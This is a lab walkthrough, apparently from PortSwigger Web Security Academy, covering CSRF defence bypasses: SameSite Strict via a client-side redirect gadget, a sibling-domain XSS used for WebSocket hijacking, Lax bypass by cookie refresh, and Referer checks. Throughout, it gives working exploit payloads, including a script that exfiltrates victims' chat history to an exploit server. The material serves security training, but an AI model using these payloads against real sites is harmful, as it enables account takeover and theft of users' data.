> NOTE: Check out [walkthrough](csrf_lab06_zaproxy.md) of this lab in OWASP Zed Attack Proxy

## Bypassing SameSite restrictions using on-site gadgets

When a cookie is marked with `SameSite=Strict` attribute, browsers exclude it from all cross-site requests. However, you might still be able to bypass this restriction by finding a mechanism --- often called a "gadget" --- that triggers a follow-up request within the same site. 

A common example of such a gadget is a client-side redirect that builds the destination URL using input controlled by the attacker, such as query parameters. For relevant examples, refer to the section on DOM-based open redirection. 

### Bypassing SameSite restrictions using on-site gadgets - Continued

From the browser's perspective, client-side redirects aren't treated as true redirects --- instead, the resulting request is seen as a separate, regular request. Crucially, this new request is considered same-site, so any site-specific cookies will be included, regardless of their `SameSite` settings.

If you can control such a redirect to trigger a harmful follow-up request, you may be able to completely sidestep SameSite cookie restrictions.

In contrast, this kind of bypass isn't possible with server-side redirects. Since the browser knows the redirect originated from a cross-site request, it still enforces the relevant cookie limitations.

### Lab: SameSite Strict bypass via client-side redirect

Open Burp's browser, navigate to the lab and log in with credentials `wiener:peter`. 

Change your email address and find the request in __Proxy__ > __HTTP History__ as `POST /my-account/change-email`.

```
POST /my-account/change-email HTTP/2
Cookie: session=utVs7Rrh4mJ9MPpEZrajVHyAs2nAsZrt

email=foo%40bar.com&submit=1
```

Notice that it does not contain any unpredictable tokens, so it may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions.

Notice response to the request `POST /login`:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=utVs7Rrh4mJ9MPpEZrajVHyAs2nAsZrt; Secure; HttpOnly; SameSite=Strict
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

The website explicitly specifies `SameSite=Strict` when setting session cookies. This prevents the browser from including these cookies in cross-site requests. 

In the browser, go to one of the blog posts and post a test commend. Go back to __Proxy__ > __HTTP History__ on Burp. Notice that the order of the requests is:

- `POST /post/comment` --- which posts your comment.
- `GET /post/comment/confirmation?postId=10` --- which sends you to a confirmation page briefly.
- `GET /resources/js/commentConfirmationRedirect.js` --- which handles your redirection from confirmation page back to the post page. 
- `GET /post/10` --- which redirects you back to the post you commented on. 

Right click the `GET /resources/js/commentConfirmationRedirect.js` request and select "Copy URL", paste it in the browser and explore the JS file. 

```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

This function builds a URL using `postId` parameter, which it retrieves with `url.searchParams.get("postId")`. So `blogPath` in the code basically resolves to `/post` and then `/` is added and to it `postId` is attached. 

Right click the `GET /post/comment/confirmation?postId=10` request and select "Copy URL". Change the `postId` value to an arbitrary string, like "foo". Notice that it goes to the confirmation page and then tries to redirect you to `/post/foo`. 

Inject a path traversal sequence in the `postId` query parameter like `10/../../my-account`. So the full path will look like:

```
/post/comment/confirmation?postId=10/../../my-account
```

Keeping in mind the above JS code, it builds a redirect URL path from this URL path:

- Starting with `/post` --- `blogPath` means `/post` like we established above. 
- and continuing with `/10/../../my-account`, because of `blogPath + '/' + postId` in the code and `10/../../my-account` is `postId` in the case of the above URL (`postId=10/../../my-account`). 

This resolves to, verbally speaking: _"Go to `/post/10/` then one level (`../`) up, which is at `/post` and then another level (../) up, which is at `/` and then from there to `my-account`."_ So the final path becomes `/my-account`. <sup>Not the best explanation, but I did my best.</sup>

Now send this request. If you ended up on `/my-account`, it means we can use the `postId` parameter to elicit a `GET` request for an arbitrary endpoint on the target site. 

Now click "Go to exploit server" and paste the following script in the "Body" section of the form:

```
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
</script>
```

<sup>(So `/post` + `/` + `../` (one level up) + `my-account` resolves to `/my-account`.)</sup>

Click "Store" and then "View exploit". As intended, it takes you to a confirmation page and then redirects you to `/my-account` page. Go to __Proxy__ > __HTTP History__ and check the `GET /my-account` request that was made with redirect. Notice that your `session` cookie is the same as it was since you were logged in. This confirms that the browser included your authenticated session cookie in the second request, even though the initial comment-submission request was initiated from an __external__ site, effectively bypassing `SameSite` restrictions.

Right-click `POST /my-account/change-email` request and select "Send to Repeater". Right click on it and select "Change request method" to automatically convert it into an equivalent `GET` request. 

```
GET /my-account/change-email?email=bar%40foo.com&submit=1 HTTP/2
```

Send it and got to `/my-account` page via browser to make sure your email has been changed. This confirms that the endpoint we are using allows us to change email using a `GET` request. All we have to do now is craft an HTML code block, that will leverage `postId` parameter to send a `GET` request that will perform this action.

```
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=10/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```

Paste it in the exploit server form's "Body" section. Click "Store". Click "Deliver exploit to victim" to solve the lab.

> NOTE: Check out [walkthrough](csrf_lab07_zaproxy.md) of this lab in OWASP Zed Attack Proxy

## Bypassing SameSite restrictions via vulnerable sibling domains

Whether you're assessing another site’s security or protecting your own, remember that a cross-origin request can still be considered same-site. This distinction is critical when evaluating potential risks.

Be sure to review the entire attack surface, especially related domains under the same site. Vulnerabilities like XSS that allow arbitrary secondary requests can completely undermine site-based defenses and leave all domains exposed to cross-site attacks.

Also, keep in mind that beyond traditional CSRF, if the target site uses WebSockets, it might be susceptible to Cross-Site WebSocket Hijacking (CSWSH). This is essentially a CSRF-style attack targeting the WebSocket handshake. For a deeper dive, check out the section on WebSocket vulnerabilities.

### Lab: SameSite Strict bypass via sibling domain

In Burp's browser go to the "Live Chat" and send a few messages. Go to __Proxy__ > __HTTP History__ and find the `GET /chat` request with `Upgrade: websocket` header in it. Notice that it doesn't contain any unpredictable tokens, which suggests it might be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions. 

In the browser, refresh the live chat page and go to __Proxy__ > __WebSockets History__ tab. Notice, that when you refresh the page, the browser sends a `READY` message to the server, which causes the server to respond with the entire chat history:

```
{"user":"You","content":"Test"}
```
```
{"user":"Hal Pline","content":"I&apos;ll look that up when my nail polish has dried."}
```
```
{"user":"You","content":"Another test"}
```
```
{"user":"Hal Pline","content":"Ask your mom."}
```
```
{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
```

Confirm the CSWSH vulnerability.

> NOTE: We will of course bypass Burp's pro-only feature __Collaborator__ and will do it on our exploit server's Access log.

Go to the exploit server and use the following template in the "Body" section:

```
<script>
    var ws = new WebSocket("wss://YOUR-LAB-ID.web-security-academy.net/chat");
    ws.onopen = function (event) {
        ws.send("READY");
    };
    ws.onmessage = function (event) {
        var message = event.data;
        fetch("https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit?message=" + btoa(message));
    };
</script>
```

The above script will send `GET` requests to the exploit server in our lab with `message` query parameters and request body as a `base64` encoded value.

Click "Store" and then "View exploit". Check "Access log" and see a `GET` request there with the following message parameter value:

```
GET /exploit?message=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1
```

Go to __Decoder__ in Burp and decode it from `base64`:

```
{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
```

This means that we successfully opened a new live chat connection with the target site, however the chat history exfiltrated is for the brand new session, which isn't particularly useful. 

Go to the __Proxy__ > __HTTP history__ tab and find the WebSocket handshake request (`GET /chat`) that was initiated by your script. Notice, that your session cookie was not sent with the request. If you look at its response:

```
HTTP/1.1 101 Switching Protocol
Set-Cookie: session=jww8cFO8yWpsaqLrzaPRhPnYdsjVFiUc; Secure; HttpOnly; SameSite=Strict
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: cmnpq9mcMw79pDx1iDahmKizoe4=
Content-Length: 0
```

The session cookie is different from yours and `SameSite` is explicitly set to `Strict` by the website. This prevents the browser from including these cookies in cross-site requests. 

In __Proxy__ > __HTTP History__ you will also notice that responses to some `/resources` requests include a different URL: `https://cms-YOUR-LAB-ID.web-security-academy.net` as a value to `Access-Control-Allow-Origin` header. This is a sibling domain. Visit this URL in Burp's browser and see a login form. 

Submit some arbitrary credentials and see that your username is reflected in the response:

```
<p>Invalid username: wiener</p>
```

Try injecting an XSS payload via the `username` parameter, for example `<script>alert(1)</script>`. Observe that `alert(1)` is called, confirming that this is a viable reflected XSS vector:

```
<p>Invalid username: <script>alert(1)</script></p>
```

Send this latest `POST /login` request to Repeater and right click it to "Change request method", which will convert this `POST` request to an equivalent `GET` request:

```
GET /login?username=<script>alert(1)</script>&password=peter HTTP/2
```

Confirm that it still receives the same response:

```
<p>Invalid username: <script>alert(1)</script></p>
```

Now right-click the request again, select "Copy URL" and visit the URL to confirm you can still trigger the XSS. If you can, this XSS vector can be used to launch the CSWSH attack without it being mitigated by SameSite restrictions as this site is a sibling domain. 

Go back to exploit server and copy the template in the "Body" section you used and stored previously. Go to Burp's __Decoder__ and URL encode the entire script:

```
%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%59%4f%55%52%2d%4c%41%42%2d%49%44%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%59%4f%55%52%2d%43%4f%4c%4c%41%42%4f%52%41%54%4f%52%2d%50%41%59%4c%4f%41%44%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
```

Write a new payload in the "Body" section of the exploit server's form:

```
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

Use the encoded URL encoded payload as a value to `username` parameter in the new payload.

Click "Store" and "View exploit" again. Go to Access log and see that you received five `GET` requests, all of which contain pieces of your entire chat history as `message` query parameter value. 

Go to __Proxy__ > __HTTP History__ and find the latest `GET /chat` request. See that it includes your session cookie, which is why it correctly identified and then exfiltrated your chat history. 

Go back to the exploit server and click "Deliver exploit to victim". Go to Access log and see five `GET` requests from the victim's IP. Copy all five of the `message` parameter's values and decode them in Burp's __Decoder__:

```base64
eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IlRoYW5rcywgSSBob3BlIHRoaXMgZG9lc24mYXBvczt0IGNvbWUgYmFjayB0byBiaXRlIG1lISJ9
eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IkhlbGxvLCBob3cgY2FuIEkgaGVscD8ifQ
eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgaGQyYTFlMjB3OGhoeXI4ejloOXEifQ
eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9
eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0
```

```
{"user":"You","content":"Thanks, I hope this doesn&apos;t come back to bite me!"}
{"user":"Hal Pline","content":"Hello, how can I help?"}
{"user":"Hal Pline","content":"No problem carlos, it&apos;s [REDACTED]"}
{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
{"user":"You","content":"I forgot my password"}
```

Use the password in the messages to log in as `carlos` to solve the lab. 

> NOTE: Check out [walkthrough](csrf_lab08_zaproxy.md) of this lab in OWASP Zed Attack Proxy

## Bypassing SameSite Lax restrictions with newly issued cookies

Cookies with `SameSite=Lax` are typically not included in cross-site POST requests, but there are notable exceptions. As previously discussed, if a site sets a cookie without specifying a `SameSite` attribute, Chrome assigns `Lax` by default. However, to preserve compatibility with single sign-on (SSO) systems, Chrome allows these cookies to be sent with top-level POST requests for the first 120 seconds after they're set. This creates a two-minute window during which cross-site attacks are still possible.

> NOTE: This grace period does not apply to cookies that were explicitly set with `SameSite=Lax`.

Although timing an attack to land within this brief window can be difficult, there are ways around it. If you can trigger functionality that forces the user's browser to receive a fresh session cookie --- such as completing an OAuth login --- you could reset the timer and immediately follow up with the attack. This works because OAuth flows often issue a new session without checking if the user is already logged in. 

### Bypassing SameSite Lax restrictions with newly issued cookies - Continued

To refresh the victim's cookie without requiring them to manually log in again, you need to initiate a __top-level navigation__. This ensures the current OAuth session cookies are sent. However, this introduces a challenge: you then need a way to redirect the victim back to your own site to carry out the CSRF attack. 

An alternative method is to launch the cookie refresh in a __new tab__, allowing you to preserve the original page for your follow-up attack. The downside is that browsers block pop-up labs unless triggered by a direct user action. For instance, running this directly will typically be blocked:

```
window.open('https://vulnerable-website.com/login/sso');
```

To work around this, wrap the `window.open()` call inside an `onclick` event, like so:

```
window.onclick = () => {
  window.open('https://vulnerable-website.com/login/sso');
};
```

This ensures the new tab opens only after the user click on the page, satisfying the browser's requirement for user interaction. 

### Lab: SameSite Lax bypass via cookie refresh

In Burp's browser, log in via your social media account with credentials `wiener:peter` and change your email address. Find the `POST /my-account/change-email` request in __Proxy__ > __HTTP History__: 

```
POST /my-account/change-email HTTP/2
...
email=attacker%40fakemail.com
```

Notice that it does not contain any unpredictable tokens, so it may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions. 

Find `GET /oauth-callback?code=[...]` request in __Proxy__ > __HTTP History__ and check its response. 

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=szr3DcM0S13RyB3O9eYBwEEsRgwDQiy0; Expires=Sat, 26 Apr 2025 15:17:11 UTC; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 2948
```

Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default `LAX` restriction level.

In the browser, go to the exploit server. Create a basic CSRF attack for changing the victim's email address:

```
<script>
    history.pushState('', '', '/')
</script>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>
```

The first `<script></script>` block changes the visible URL in the browser's address bar to `/`, but without actually navigating or reloading the page. This is meant to hide the true malicious URL.

The `<form></form>` block is a `POST` request to the vulnerable target site's `change-email` endpoint.

The second `<script></script>` block automatically submits the form as soon as the page loads. 

Paste this exploit in the "Body" section of the exploit server's form and click "Store". Click "View exploit". 

> NOTE: If 2 minutes haven't passed since you logged in, this will automatically change your email to `foo@bar.com`. If it's over 2 minutes since you logged in, then it only log you in once again and then, all you have to do is immediately go back to exploit server and click "View exploit" in under 2 minutes.

Once the exploit has been successful, find `POST /my-account/change-email` request under __Proxy__ > __HTTP history__, specifically the one initiated by your exploit. Notice that it included the `session` cookie you were assigned once you logged in and it added a new one to it as well. 

If you visit `/social-login`, this automatically initiates the full OAuth flow. If you check it in __Proxy__ > __HTTP history__ you'll notice that after every OAuth flow, the target site sets a new session cookie even if you were already logged in. 

Back in the exploit server, change our original payload (the second `<script></script>` block) so that it first refreshes the victim's session by forcing their browser to visit `/social-login`, then submits the email change request after a short pause:

```
<script>
    history.pushState('', '', '/')
</script>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="bar@foo.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

Click "Store" and then "View exploit". Notice that the initial request gets blocked by the browser's popup blocker. After a pause of 5 seconds the attack is still launched. However this is only successful if it has been less than two minutes since your cookie was set. If not the attack fails because the popup blocker prevents the forced cookie refresh. 

The popup is being blocked, because you haven't manually interacted with the page. Wrap the popup function code inside a `window.onclick` attribute so that it only opens the popup once the user clicks:

```
<script>
    history.pushState('', '', '/')
</script>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="far@boo.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

Click "Store" and then "View exploit". When prompted, click the page. This triggers the OAuth flow and issues you a new session cookie. After 5 seconds, notice that the CSRF attack is sent and the POST /my-account/change-email request includes your new session cookie. 

Deliver the exploit to the victim to solve the lab.

> NOTE: Walkthrough of this lab in OWASP Zed Attack Proxy is not included, because the functionality of ZAP to be used to solve this lab has been extensively covered in other labs. 

## Bypassing Referer-based CSRF defenses

In addition to using CSRF tokens, some applications attempt to defend against CSRF attacks by checking the HTTP __Referer__ header to confirm the request originated from their own domain. However, this method is typically less reliable and can often be bypassed. 

The HTTP __Referer__ header (misspelled in the original HTTP spec) is an optional field that indicates the URL of the page that initiated the request. Browsers usually include it automatically when users perform actions like clicking a link or submitting a form. However, there are several ways the referring page can suppress or alter this header --- commonly done to preserve user privacy. 

## Validation of Referer depends on header being present

Some applications check the __Referer__ header when it's included in a request but fail to perform any validation if the header is missing. 

This creates an opportunity for attackers to design a CSRF exploit that deliberately causes the victim's browser to omit the __Referer__ header. One simple method to do this is by adding a `<meta>` tag to the CSRF page like this:

```
<meta name="referrer" content="never">
```

This instructs the browser not to send the __Referer__ header at all. 

### Lab: CSRF where Referer validation depends on header being present. 

Open Burp's browser and log in as `wiener:peter`. Update your email and find the resulting `POST /my-account/change-email` request in __Proxy__ > __HTTP history__. 

Right-click the request and select "Send to Repeater". Once in Repeater, change the domain in Referer HTTP header and send. Observe that request is rejected:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 24

"Invalid referer header"
```

Delete the __Referer__ header, click Send. Observe that the request is now accepted. 

```
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Create and host a proof of concept exploit and include the `<meta name="referrer" content="no-referrer">` to suppress the Referer header:

```
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

Click "Store" and then "Deliver exploit to victim" to solve the lab.

> NOTE: Skipping OWASP Zed Attack Proxy walkthrough of this lab. These functions of ZAP are already extensively covered.

## Validation of Referer can be circumvented

Some applications perform overly simplistic checks on the __Referer__ header, making them vulnerable to bypasses. For instance, if the app only checks that the __Referer__ domain starts with a certain string, an attacker can exploit this by embedding that domain as a subdomain of their own:

```
http://vulnerable-website.com.attacker-website.com/csrf-attack
```

Similarly, if the validation merely looks for the presence of the trusted domain anywhere in the __Referer__, an attacker can include it in a query parameter:

```
http://attacker-website.com/csrf-attack?vulnerable-website.com
```

> NOTE: While tools like Burp Suite might show these tricks working, browsers often strip out query strings from the __Referer__ header to protect sensitive information. To prevent this stripping and ensure the full URL is sent, you can include the following header in your exploit's response:

```
Referrer-Policy: unsafe-url
```

### Lab: CSRF with broken Referer validation

In Burp's browser log into the lab as `wiener:peter` and update your email. Navigate to `POST /my-account/change-email` request in __Proxy__ > __HTTP history__. 

Send the request to __Repeater__ and change the domain in `Referer` header and click Send. Notice that the request is rejected.

Copy the original domain of your lab instance and append it to the `Referer` header in the form of a query string, or like this:

```
Referer: https://foobar.net?YOUR-LAB-ID.web-security-academy.net
```

The response should be:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

As you can see the request is now accepted. The websute seems to accept any `Referer` header as long as it contains the expected domain somewhere in the string. 

Create a CSRF proof of concept exploit and host it on the exploit server. Edit the JavaScript so that the third argument of the `history.pushState()` function includes a query string with your lab instance URL as follows: 

```
<script>
  history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
</script>
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.

In the "Head" section of the exploit server form, include the following header to override the browser stripping query string from the `Referer` header:

```
Referrer-Policy: unsafe-url
```

Click "Store" and then "Deliver exploit to victim" to solve the lab.

> Next write-up: [Clickjacking (UI redressing)](../psa_clickjacking/README.md)
